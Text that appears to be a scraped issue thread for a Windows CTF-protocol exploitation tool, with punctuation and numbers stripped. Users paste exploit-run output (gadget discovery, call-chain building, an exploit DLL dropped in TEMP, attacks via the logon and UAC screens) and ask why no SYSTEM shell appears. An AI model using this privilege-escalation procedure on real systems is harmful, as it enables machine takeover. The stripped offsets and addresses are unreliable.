Fix linker errors due to missing symbols by defaulting to building Win libraries Sorry I dont recognise stub for thread Sorry I dont recognise stub for thread Sorry I dont recognise stub for thread Sorry I dont recognise stub for thread Sorry I dont recognise stub for thread Sorry I dont recognise stub for thread Sorry I dont recognise stub for thread Sorry I dont recognise stub for thread x ffb e Guessed combase C WINDOWS system combaseDLL Found Gadget b in module combase at offset x ed c C WINDOWS system combaseDLLtextVirtualAddress is x C WINDOWS system combaseDLLtextPointerToRawData is x Payload created and call chain ready get ready Sorry I dont recognise stub for thread ctf An interactive ctf exploration tool by taviso Type help for available commands Most commands require a connection see help connect ctf connect The ctf server port is located at BaseNamedObjects msctfserverDefault NtAlpcConnectPort BaseNamedObjects msctfserverDefault Connected to CTF server BaseNamedObjects msctfserverDefault Handle ctf scan failed to send message to server giving up xc ctf all is going well just the cmd is not getting spawned on the locked screen Below are the artifacts for the same ctf script scripts ctflogonuisystemctf Attempting to copy exploit payload Cpayload dll Files copied The screen will lock to trigger the login screen in seconds Closing existing ALPC Port Handle C The ctf server port is located at BaseNamedObjects msctfserverWinlogon Connected to CTF server BaseNamedObjects msctfserverWinlogon Handle C Client Tid Flags Hwnd A Pid ctftoolexe Client Tid Flags x c Hwnd EC Pid LogonUIexe Found new client LogonUIexe DefaultThread now ReleaseId is Guessed msvcrt C WINDOWS system msvcrtDLL Found Gadget C in module msvcrt at offset x c C WINDOWS system msvcrtDLLtextVirtualAddress is x C WINDOWS system msvcrtDLLtextPointerToRawData is x C WINDOWS system kernel DLLdataVirtualAddress is x a Command succeeded stub created Dumping Marshal Parameter Base Type x Size x Offset x d e c f d a a b c Mq C c f C Marshalled Value COM C E D F D A A B C ID Timestamp x fc x ffdf x ffdf a x ffdf b Guessed msctf C WINDOWS system msctfDLL Found Gadget b in module msctf at offset xc C WINDOWS system msctfDLLtextVirtualAddress is x C WINDOWS system msctfDLLtextPointerToRawData is x x ffdf a Guessed kernel C WINDOWS system kernel DLL C WINDOWS system kernel DLL is a bit module kernel LoadLibraryA x x e The CFG call chain is built writing in parameters Writing in the payload path C WINDOWS TEMP EXPLOITDLL x ffdf d Guessed combase C WINDOWS system combaseDLL Found Gadget b in module combase at offset x d C WINDOWS system combaseDLLtextVirtualAddress is x C WINDOWS system combaseDLLtextPointerToRawData is x Payload created and call chain ready get ready Exploit complete So I run into this issue when I run the ctfconsentsystemctf script Pops UAC gives me the error in the screenshot and then just doesnt work Reopens UAC and then does nothing Based off what youve shared Im doing the same stuff as you Run the script hit an app that requires UAC and then I wait All Im trying to open is CMD I also tried it with running acrobat as admin and when UAC pops it flashes and then comes back again and then doesnt do anything Running winversion is win will the exploit work This seems possible on Windows Server too I will be having a look later for the correct index for CTipProxy however the jump to msvcrts inittime seems possible Im getting the failed message What can cause this issue As standard untrusted user running ctftool on Windows VM Version OS Build errors The code execution cannot proceed because MSVCP dll was not found Reinstalling the program may fix this problems The code execution cannot proceed because vcruntime dll was not found Reinstalling the program may fix this problem Need to include dll dependencies in makefile Thanks Im experimenting with this in a corporate environment but I cant seem to get a cmd shell spawned Apologies if Im missing something trivial Host is a Win VM Enterprise running in VMWare Latest updates are from the th July Testing with the ctfconsentsystemctf ctfexploitcommonwin ctf and ctflogonuisystemctf fails to result in a shell being spawned yet the output shows Exploit complete Checking process explorer there are no new cmdexe processes running in other sessionshidden Is this expected to work or am I missing something Whats the best way to go about debugging this